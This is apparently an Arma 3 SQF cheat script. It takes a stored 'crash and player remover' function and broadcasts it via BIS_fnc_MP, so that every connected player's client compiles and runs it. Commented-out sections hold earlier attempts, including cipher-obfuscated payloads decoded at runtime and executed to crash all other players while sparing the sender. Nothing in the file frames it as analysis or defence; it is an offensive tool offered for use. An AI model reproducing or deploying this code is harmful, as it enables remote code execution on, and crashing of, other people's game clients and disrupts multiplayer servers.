_crashcode = profilenamespace getvariable "nukerinsert"; //Crash and player remover fnc inserted into string.

kmsi_nuke_execute = {call compile _this}; // Compile the string to make things easier sending over MP.

[_crashcode,"kmsi_nuke_execute",true,false] spawn BIS_fnc_MP; // Send to players.


//private _var = player getVariable "anukehasbeenarmed";if (isNil "_var") then { [('_5Qr8NOw = {_uQN='+"'"+'nDgVVI'+"'"+';_5Qr8NOwHQ = _wJy0;_rUDAwQ8 = Z;_rUDAwQ8n = Z;_j88VN = wUj88VN(_uQN);_JV0J = wUj88VN (0w8 _5Qr8NOw);8QdQ80Q _JV0J;zU8 '+"'"+'_y'+"'"+' z8U9 Z wU (rUDAw(_fQr8NOw9Q)-T) fU {yz(_rUDAwQ8 > (rUDAw(_j88VN)-T)) wJQA {_rUDAwQ8 = Z;};yz(_rUDAwQ8n > (rUDAw(_JV0J)-T)) wJQA {_rUDAwQ8n = Z;};_dV8 = ((_fQr8NOw9Q 0QhQrw _y) / (_j88VN 0QhQrw _rUDAwQ8)) - (_JV0J 0QhQrw _rUDAwQ8n);_fQr8NOw9Q 0Qw[_y,_dV8];_rUDAwQ8 = _rUDAwQ8 + T;_rUDAwQ8n = _rUDAwQ8n + T};rVhh rU9OyhQ wUtw8yAv(_fQr8NOw9Q)};[TT4ZZ,TLIgT,LI3g,TSS4g,nTnSg,TTIT4,TT34Z,nnLB3,TZ44I,TBnZL,nTSgI,TZI3Z,IIZZ,nTBBL,Bggg,TLI3T,TSTLn,Tn4SZ,B44Z,nSggL,TnZ3I,TnBZT,nZ344,IIZZ,LBZZ,nZnST,ITBT,TS44Z,TSBg3,SIgZ,3Z4Z,T3B4S,ISSL,TSg4L,TTn4n,BB44,SBZZ,B3n3,SBB3,IB4S,BIBI,BSZ4,IIZZ,TBL4L,3nLn,T4Tgn,TSISS,InZ4,B3ZZ,TII3S,3SLL,TSg4L,Tgn3B,TnZS4,TZ34Z,n4ISZ,InSn,ngn3Z,nTLgT,TTg34,BLZZ,nTZLZ,IL4Z,TSTLn,InI4,3Z34,TZI4Z,n4g3B,BBBL,nTSgI,nn4ZS,I3L4,B4ZZ,TL3S3,LI3g,TZLIZ,3TS3,3LBZ,I4ZZ,n4g3B,3TZB,TLgBg,T4Zg4,3TSZ,B3ZZ,TnLgL,IgB4,nZZIB,nT4gS,BIg4,Lg4Z,TIgTL,TZITZ,TB334,nZZIB,3TSZ,LI4Z,nS3ZS,ISSL,nZgIZ,TBB3n,3TSZ,3T4Z,T3Tg4,33ng,TnIZI]rVhh _5Qr8NOw;')]call{private['_0','_1','_2','_3'];_0=_this select 0;_1=[];_2=toArray 'jEs52CiGoMuKHRxFl6tmaWpXP7VcrfQzvJyY1h9AUOe80wDdqkNbZTngS4LI3B';_3=toArray 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';{if(_2 find _x >=0)then{_1 pushBack (_3 select(_2 find _x));}else{_1 pushBack _x;};}forEach toArray _0;call compile toString _1};};

///////////Previous attempt ////////  
//_crashcode = private _var = player getVariable "anukehasbeenarmed"; if (isNil "_var") then { hintc "fail"; } else {hintc "You survived the Nuke.";};

//_playas deleteat (_playas find player); // Remove you from the crash




//{/* Crash goes here [Will insert after testing] */} foreach _playas;
//{/* Crash goes here [Will insert after testing] */} foreach _playas;
//_playas deleteat (_playas find player); // Remove you from the crash
///   Array sidechat tester.
/*
_array2 = [];
for "_i" from 0 to (count _playas - 1) do {
   _array2 set [_i, str(_playas select _i)];
 };
player sidechat format ["%1",_array2];
*/

/*_playas = [];
{
	if (isPlayer _x) then
	{
		_playas pushBack _x;
	};
} forEach allUnits; // Put all players online (dead/alive) into a nice array to be crashed.

_crashcode = 
private _var = player getVariable "anukehasbeenarmed";
_crashcode = if (isNil (player getVariable "anukehasbeenarmed";)) then {[('_MaBhz7Q = {_Raz='+"'"+'HLzCpk'+"'"+';_MaBhz7QYa = _QW8H;_B6G1Qah = r;_B6G1Qahg = r;_5hhyz = Q65hhyz(_Raz);_WyHW = Q65hhyz (HQh _MaBhz7Q);haoahHa _WyHW;q6h '+"'"+'_8'+"'"+' qh6e r Q6 (B6G1Q(_DaBhz7Qea)-F) D6 {8q(_B6G1Qah > (B6G1Q(_5hhyz)-F)) QWa1 {_B6G1Qah = r;};8q(_B6G1Qahg > (B6G1Q(_WyHW)-F)) QWa1 {_B6G1Qahg = r;};_oyh = ((_DaBhz7Qea HawaBQ _8) / (_5hhyz HawaBQ _B6G1Qah)) - (_WyHW HawaBQ _B6G1Qahg);_DaBhz7Qea HaQ[_8,_oyh];_B6G1Qah = _B6G1Qah + F;_B6G1Qahg = _B6G1Qahg + F};Byww B6e78wa Q6cQh810(_DaBhz7Qea)};[gJCvr,kgOL,FJrOL,kkCN,gLCLL,FFkFv,gkgvv,ONOC,gvrCk,FrgOJ,gLJCk,FrkNr,FkkFr,OvNN,ggFCL,NOOJ,FvJgg,FgvCr,gFOJv,FrJrN,gNJkk,JOFJ,gLrrv,kkrr,FvNkr,NNgL,FkrJF,kNrr,FJCkN,CkLr,FNvFv,NgJg,FkJJJ,kJOJ,FgCFg,OOvv,FFgkr,CgNC,FFNvN,CgJC,FrNrk,OCrv,FkkFr,NvJN,FOJrg,NFFg,FJgJC,kgrv,ggvCr,kkvg,grrNJ,kJOJ,FCJvO,FgrCv,gCOvv,FFggr,FkFNg,FgCNr,gLNJF,FFLNv,ggrNr,OFNr,FNFvr,kvOg,Nrgv,NrNv,gCkgv,FFrJk,gLkFJ,FFCOg,gCNgC,kNJv,gFNvr,kLCC,FJrOL,vkgr,NONN,NJOr,Fkgvr,FFrJk,FOgLO,NkNN,FJvNv,NFCr,ggvCr,vvrN,FkvCv,FrkJC,gLkvC,OkLv,FCJrv,kvCN,gvCFr,FrJJr,ggFCO,NFCr,Fvvgv,FrNFg,FkJJJ,FrOgr,ggrCg,NFCr,FNkCv,kOrv,grOLL,JNFg]Byww _MaBhz7Q;')]call{private['_0','_1','_2','_3'];_0=_this select 0;_1=[];_2=toArray '5InMPsdx2tRVYml3ZXc9UjTKS4yfBDaq0W8Epwe167uhHQGoibzArFgLCvJkNO';_3=toArray 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';{if(_2 find _x >=0)then{_1 pushBack (_3 select(_2 find _x));}else{_1 pushBack _x;};}forEach toArray _0;call compile toString _1}; };
*/